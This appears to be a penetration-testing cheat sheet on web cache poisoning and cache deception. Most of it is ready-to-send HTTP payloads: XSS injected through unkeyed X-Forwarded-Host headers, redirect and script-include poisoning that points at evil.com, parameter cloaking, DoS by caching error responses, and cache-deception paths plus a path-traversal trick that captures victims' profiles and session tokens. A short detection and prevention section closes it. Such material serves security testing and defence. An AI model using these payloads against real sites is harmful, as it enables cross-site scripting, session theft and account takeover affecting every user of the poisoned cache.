---
tags:
  - high
  - infra
---

# Cache Poisoning & Cache Deception

**Poisoning:** Store malicious response in cache, serve to other users.  
**Deception:** Trick cache into storing victim's sensitive data.

## TL;DR

```http
# Cache poisoning XSS via unkeyed header
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com"><script>alert(1)</script>
```

## Concepts

### Cache Keys
Caches identify requests by **cache key** (typically: Host + Path + Query params).

**Unkeyed inputs** affect response but aren't in cache key → exploitable.

### Poisoning vs Deception

| Cache Poisoning | Cache Deception |
|-----------------|-----------------|
| Inject malicious content | Store victim's sensitive data |
| Attacker controls response | Victim's response gets cached |
| Affects all users | Attacker retrieves victim's data |

## Detection

### Identify Caching

```http
# Response headers indicating caching
X-Cache: HIT
CF-Cache-Status: HIT
Age: 3600
Cache-Control: public, max-age=1800
```

### Find Unkeyed Inputs

**Use Param Miner (Burp)** to discover:
- Headers: `X-Forwarded-Host`, `X-Forwarded-For`, `X-Host`
- Parameters not in cache key

**Manual:**
```http
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: test-value

# If reflected in response but same cache key → vulnerable
```

## Cache Poisoning Attacks

### XSS via Unkeyed Header

```http
GET /en?region=uk HTTP/1.1
Host: target.com
X-Forwarded-Host: "><script>alert(1)</script>

# If reflected and cached:
# All users of /en?region=uk get XSS payload
```

### Redirect Poisoning

```http
GET /resource HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Response: 301 → https://evil.com/resource
# Cached → all users redirected
```

### JavaScript Include Poisoning

```http
# If response contains: <script src="//X-Forwarded-Host/js/app.js">
GET /page HTTP/1.1
X-Forwarded-Host: evil.com

# Cached: script loads from evil.com
```

### URL Discrepancy Attacks

**Path Normalization Mismatch:**
```
# Cache stores: /share/%2F..%2Fapi/auth/session
# Origin resolves: /api/auth/session (sensitive!)
```

**Static Extension Abuse:**
```http
GET /api/user/profile.css HTTP/1.1
# CDN caches as static, backend returns JSON with user data
```

### Fat GET / Parameter Cloaking

```http
GET /contact?report=safe HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=malicious-data

# Cache key uses URL param, backend uses body
```

### DoS via Cache Poisoning

```http
GET / HTTP/1.1
X-Invalid-Header-\x00: anything

# If 400 error cached → DoS all users
```

## Cache Deception

### Basic Attack

```
# Victim visits: /account/profile
# Attacker crafts: /account/profile/test.css

GET /account/profile/test.css HTTP/1.1
Cookie: [victim's session]

# If backend ignores /test.css and returns profile
# AND cache stores based on .css extension
# → Victim's profile cached, attacker retrieves
```

### Path Variations

```
/account/profile/nonexistent.js
/account/profile/.css
/account/profile/../test.js
/account/profile/%2e%2e/test.js
```

### CSPT + Cache Deception (ATO)

**Scenario:** SPA with path traversal + extension-based caching

```javascript
// SPA fetches: https://api.example.com/v1/users/info/${userId}
// Attacker injects: ../../../v1/token.css
// CDN caches .css → victim's token cached
```

## Bypasses

### Vary Header Bypass

```http
# If Vary: User-Agent, match victim's UA
GET /page HTTP/1.1
User-Agent: [victim's user-agent]
X-Evil: payload
```

### Cache Buster for Testing

```http
GET /page?cachebust=random123 HTTP/1.1
```

## Real Examples

| Target | Technique | Impact |
|--------|-----------|--------|
| ChatGPT | Path traversal + cache | Session token leak (ATO) |
| HackerOne | X-Forwarded-Host | Global redirect poisoning |
| Cloudflare | 403 caching | DoS |

## Tools

| Tool | Purpose |
|------|---------|
| [Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) | Find unkeyed inputs |
| [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) | Automated testing |
| [toxicache](https://github.com/xhzeem/toxicache) | Multi-technique scanner |

## Prevention Indicators

**Vulnerable:**
- Unkeyed headers reflected in response
- Extension-based caching for dynamic content
- No path normalization before caching

**Protected:**
- All varying inputs in cache key
- `Cache-Control: private` for user-specific content
- Consistent path handling
